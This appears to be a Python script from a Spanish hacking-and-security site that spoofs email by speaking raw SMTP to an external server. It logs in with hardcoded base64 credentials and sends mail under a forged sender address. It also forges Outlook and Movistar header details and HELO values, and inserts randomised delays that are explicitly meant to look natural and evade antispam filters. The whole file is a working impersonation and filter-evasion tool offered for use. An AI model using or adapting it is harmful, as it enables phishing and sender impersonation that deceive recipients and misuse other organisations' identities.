###################################################################
## Script en Python 3
## contecta con SMTP externo, autenticacion basica
## suplanta correo
## hackingyseguridad.com
###################################################################

import socket
import base64
import time
import random

def send_email_with_retry():
    max_retries = 2
    retry_count = 0

    while retry_count < max_retries:
        try:
            print("Intento {} de {}".format(retry_count + 1, max_retries))
            send_smtp_email()
            break
        except Exception as e:
            retry_count += 1
            print("Error en intento {}: {}".format(retry_count, e))
            if retry_count < max_retries:
                delay = random.randint(10, 20)
                print("Reintentando en {} segundos...".format(delay))
                time.sleep(delay)
            else:
                print("✗ Todos los intentos fallaron")

def send_smtp_email():
    # Configuración (manteniendo tus parámetros originales)
    smtp_server = "smtp.hackingyseguridad.com"
    port = 25

    # Email details (manteniendo tus direcciones)
    from_email = "correosuplantado@dominio.com"
    to_emails = [
        "antonio.taboada@gmail.com",
        "antonio.taboada@gmail.com"
    ]

    # Cabeceras mejoradas para Outlook
    email_headers = """From: "correosuplantado@dominio.com" <{}>
To: {}
Message-ID: <{}{}@mdominio.com>
Subject: Notificación Importante - Actualización de Servicio
Date: {}
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit
X-Mailer: Microsoft Outlook 16.0
X-Priority: 3
X-MSMail-Priority: Normal
X-Originating-IP: [194.224.58.62]
Return-Path: {}
Precedence: bulk
Auto-Submitted: auto-generated""".format(
        from_email,
        ", ".join(to_emails),
        int(time.time()),
        random.randint(1000, 9999),
        time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime()),
        from_email
    )

    # Mensaje completo (manteniendo tu contenido)
    email_body = """  happyHacking!

@antonio_taboada   - http://www.hackingyseguridad.com/"""

    # Conexión SMTP con mejor manejo de timeouts
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(45)

    print("Conectando a {}:{}...".format(smtp_server, port))
    sock.connect((smtp_server, port))

    def send_cmd(command, delay=2.5):
        if command:
            print(">>> {}".format(command))
            sock.send((command + "\r\n").encode())
        time.sleep(delay + random.uniform(0.5, 1.5))  # Delay variable
        response = sock.recv(2048).decode()
        print("<<< {}".format(response.strip()[:100]))  # Mostrar solo parte de la respuesta
        return response

    try:
        # Banner inicial con delay extendido
        print("Esperando banner del servidor...")
        initial_response = send_cmd(None, 4)

        # HELO con dominio válido pero manteniendo tu formato
        send_cmd("helo relayout03.e.movistar.es", 3)

        # AUTH LOGIN con timing más natural
        send_cmd("AUTH LOGIN", 2)
        send_cmd("aGFja2luZ3lzZWd1cmlkYWRAaGFja2luZ3lzZWd1cmlkYWQuY29t", 3)  # Usuario
        send_cmd("YWRtaW5p", 3)  # Contraseña

        # MAIL FROM
        send_cmd("MAIL FROM: <{}>".format(from_email), 2)

        # RCPT TO con delays variables entre destinatarios
        for i, email in enumerate(to_emails):
            send_cmd("RCPT TO: <{}>".format(email), random.randint(2, 4))

        # DATA con delay antes de enviar contenido
        send_cmd("DATA", 3)

        # Enviar cabeceras completas
        print("Enviando cabeceras del email...")
        for line in email_headers.split('\n'):
            sock.send((line + "\r\n").encode())
            time.sleep(0.3)

        # Línea en blanco entre cabeceras y cuerpo
        sock.send(("\r\n").encode())
        time.sleep(1)

        # Enviar cuerpo del mensaje con timing natural
        print("Enviando cuerpo del mensaje...")
        lines = email_body.split('\n')
        for i, line in enumerate(lines):
            sock.send((line + "\r\n").encode())
            # Delay variable dependiendo de la línea
            if line.strip() == "":
                time.sleep(0.5)
            elif line.startswith("**") or line.startswith("---"):
                time.sleep(0.8)
            else:
                time.sleep(0.4)

        # Finalizar DATA con delay extendido
        print("Finalizando envío de datos...")
        sock.send(("\r\n.\r\n").encode())
        time.sleep(4)  # Delay importante antes de recibir respuesta DATA
        data_response = sock.recv(1024).decode()
        print("<<< {}".format(data_response.strip()))

        # QUIT con delay corto
        send_cmd("QUIT", 2)

        print("✓ Email enviado exitosamente mediante Outlook")
        print("✓ Mensaje optimizado para filtros de correo")

    except socket.timeout:
        print("✗ Timeout en la conexión SMTP")
        # Intentar QUIT de todas formas
        try:
            sock.send("QUIT\r\n".encode())
            time.sleep(2)
        except:
            pass
        raise
    except Exception as e:
        print("✗ Error durante el envío: {}".format(e))
        raise
    finally:
        try:
            sock.close()
        except:
            pass

def main():
    print("=== SISTEMA DE NOTIFICACIONES ===")
    print("Optimizado para entrega en Outlook y filtros antispam")
    print("Servidor: smtp.telefonica.net:25")
    print("=" * 60)

    # Delay inicial aleatorio para parecer más natural
    initial_delay = random.randint(5, 12)
    print("Iniciando en {} segundos...".format(initial_delay))
    time.sleep(initial_delay)

    send_email_with_retry()

    print("=" * 60)
    print("Proceso de notificación completado")

if __name__ == "__main__":
    main()
